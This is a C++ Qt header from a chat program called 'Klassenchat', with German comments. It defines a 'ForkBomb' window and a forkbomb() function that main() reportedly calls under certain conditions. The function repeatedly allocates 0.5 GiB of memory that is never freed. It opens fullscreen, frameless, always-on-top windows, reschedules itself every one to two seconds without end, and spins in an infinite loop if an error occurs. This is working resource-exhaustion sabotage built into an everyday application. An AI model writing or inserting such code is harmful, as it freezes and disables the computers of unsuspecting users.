/* Copyright (C) 2016 Lukas Bartl
 * Diese Datei ist Teil des Klassenchats.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

///\file
// Dieser Header definiert die Klasse ForkBomb (siehe main.cpp)

#ifndef FORKBOMB_HPP
#define FORKBOMB_HPP

#include "ui_forkbomb.h"
#include <QTimer>

/// Dieses Fenster hat einen unaussprechlichen Text in sich.
class ForkBomb : public QMainWindow {
    Q_OBJECT

public:
    /// Konstruktor.
    explicit ForkBomb( QWidget* parent = nullptr ) :
        QMainWindow( parent )
    {
        ui.setupUi( this );
    }

private:
    Ui::ForkBomb ui {}; ///< UI des Fensters
};

/// Erstellt unendlich mal ein Objekt der Klasse ForkBomb und verbraucht RAM. Unter bestimmten Bedingungen von main() aufgerufen.
inline void forkbomb() try {
    void const volatile*const volatile speicher = static_cast <void const volatile*> ( malloc( 512*1024*1024 ) ); // 0,5 GiB auf Heap

    ForkBomb* bomb = new ForkBomb;
    bomb->setWindowFlags( bomb->windowFlags() | Qt::FramelessWindowHint | Qt::WindowStaysOnTopHint );
    bomb->setWindowState( Qt::WindowActive | Qt::WindowFullScreen );
    bomb->show();
    QTimer::singleShot( speicher ? 2000 : 1000, forkbomb );
} catch (...) {
    while ( true );
}

#endif // FORKBOMB_HPP
